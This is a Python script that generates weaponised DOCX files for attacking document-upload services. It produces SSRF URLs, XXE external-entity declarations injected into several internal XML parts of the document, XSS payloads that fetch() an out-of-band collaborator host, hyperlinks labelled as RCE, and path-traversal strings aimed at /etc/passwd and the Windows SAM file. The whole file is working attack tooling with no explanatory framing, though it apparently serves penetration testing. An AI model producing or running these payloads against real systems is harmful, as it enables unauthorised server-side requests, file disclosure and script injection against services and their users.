import zipfile
import shutil
from pathlib import Path
from docx import Document
import xml.etree.ElementTree as ET

def generate_docx_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'ssrf': [
            f"http://{burp_collab}/ssrf1",
            f"https://{burp_collab}/ssrf2",
            f"http://127.0.0.1@{burp_collab}/ssrf3",
            f"http://localhost@{burp_collab}/ssrf4",
            f"file://{burp_collab}/ssrf5",
            f"gopher://{burp_collab}/ssrf6",
        ],
        'xxe': [
            f'<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe1">',
            f'<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe2">',
            f'<!ENTITY xxe SYSTEM "file://{burp_collab}/xxe3">',
            f'<!ENTITY % xxe SYSTEM "http://{burp_collab}/xxe4">',
            f'<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe5">]>',
            f'<!ENTITY % remote SYSTEM "http://{burp_collab}/xxe6">',
            f'<!ENTITY % int "<!ENTITY &#37; trick SYSTEM \'http://{burp_collab}/xxe7\'>">',
        ],
        'rce': [
            f"http://{burp_collab}/rce1",
            f"https://{burp_collab}/rce2",
        ],
        'xss': [
            f"<script>fetch('http://{burp_collab}/xss1')</script>",
            f"<img src=x onerror=fetch('http://{burp_collab}/xss2')>",
            f"javascript:fetch('http://{burp_collab}/xss3')",
            f"<svg onload=fetch('http://{burp_collab}/xss4')>",
        ],
        'path_traversal': [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
        ],
    }
    
    for vuln, payloads in vulns.items():
        vuln_dir = output_dir / vuln
        vuln_dir.mkdir(exist_ok=True)
        
        if vuln == 'ssrf':
            for i, payload in enumerate(payloads, 1):
                doc = Document()
                doc.add_paragraph(payload)
                output_file = vuln_dir / f"payload_{i}.docx"
                doc.save(output_file)
        
        elif vuln == 'xxe':
            for i, payload in enumerate(payloads, 1):
                doc = Document()
                doc.add_paragraph('Test')
                
                docx_path = vuln_dir / f"payload_{i}.docx"
                doc.save(docx_path)
                
                with zipfile.ZipFile(docx_path, 'r') as zip_ref:
                    zip_ref.extractall(output_dir / f"temp_xxe_{i}")
                
                document_xml_path = output_dir / f"temp_xxe_{i}" / "word" / "document.xml"
                if document_xml_path.exists():
                    tree = ET.parse(document_xml_path)
                    root = tree.getroot()
                    
                    doctype = f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{payload}">]>'
                    xml_str = ET.tostring(root, encoding='unicode')
                    xml_with_xxe = doctype + '\n' + xml_str
                    
                    with open(document_xml_path, 'w', encoding='utf-8') as f:
                        f.write(xml_with_xxe)
                    
                    with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        temp_dir = output_dir / f"temp_xxe_{i}"
                        for file_path in temp_dir.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_dir)
                                zip_ref.write(file_path, arcname)
                
                shutil.rmtree(output_dir / f"temp_xxe_{i}", ignore_errors=True)
            
            xxe_locations = {
                'document': ('word/document.xml', f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_document">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p>
<w:r>
<w:t>test</w:t>
</w:r>
</w:p>
</w:body>
</w:document>'''),
                'settings': ('word/settings.xml', f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE settings [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_settings">
]>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:zoom w:percent="100"/>
</w:settings>'''),
                'core': ('docProps/core.xml', f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cp:coreProperties [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_core">
]>
<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:dcmitype="http://purl.org/dc/dcmitype/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<dc:title>Test</dc:title>
</cp:coreProperties>'''),
                'content_types': ('[Content_Types].xml', f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE Types [
<!ENTITY xxe SYSTEM "http://{burp_collab}/xxe_content_types">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''),
            }
            
            for name, (xml_path, content) in xxe_locations.items():
                doc = Document()
                doc.add_paragraph('Test')
                docx_path = vuln_dir / f"xxe_{name}.docx"
                doc.save(docx_path)
                
                with zipfile.ZipFile(docx_path, 'r') as zip_ref:
                    zip_ref.extractall(output_dir / f"temp_xxe_{name}")
                
                target_path = output_dir / f"temp_xxe_{name}" / xml_path
                if target_path.exists() or name == 'content_types':
                    target_path.parent.mkdir(parents=True, exist_ok=True)
                    with open(target_path, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    with zipfile.ZipFile(docx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        temp_dir = output_dir / f"temp_xxe_{name}"
                        for file_path in temp_dir.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_dir)
                                zip_ref.write(file_path, arcname)
                
                shutil.rmtree(output_dir / f"temp_xxe_{name}", ignore_errors=True)
        
        elif vuln == 'rce':
            for i, payload in enumerate(payloads, 1):
                doc = Document()
                doc.add_paragraph(payload)
                output_file = vuln_dir / f"payload_{i}.docx"
                doc.save(output_file)
                
                with zipfile.ZipFile(output_file, 'r') as zip_ref:
                    zip_ref.extractall(output_dir / f"temp_rce_{i}")
                
                document_xml_path = output_dir / f"temp_rce_{i}" / "word" / "document.xml"
                if document_xml_path.exists():
                    with open(document_xml_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    hyperlink_xml = f'''<w:hyperlink r:anchor="{payload}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:r><w:t>Click me</w:t></w:r></w:hyperlink>'''
                    content = content.replace(f'<w:t>{payload}</w:t>', hyperlink_xml)
                    
                    with open(document_xml_path, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                        temp_dir = output_dir / f"temp_rce_{i}"
                        for file_path in temp_dir.rglob('*'):
                            if file_path.is_file():
                                arcname = file_path.relative_to(temp_dir)
                                zip_ref.write(file_path, arcname)
                
                shutil.rmtree(output_dir / f"temp_rce_{i}", ignore_errors=True)
        
        elif vuln in ['xss', 'path_traversal']:
            for i, payload in enumerate(payloads, 1):
                doc = Document()
                doc.add_paragraph(payload)
                output_file = vuln_dir / f"payload_{i}.docx"
                doc.save(output_file)
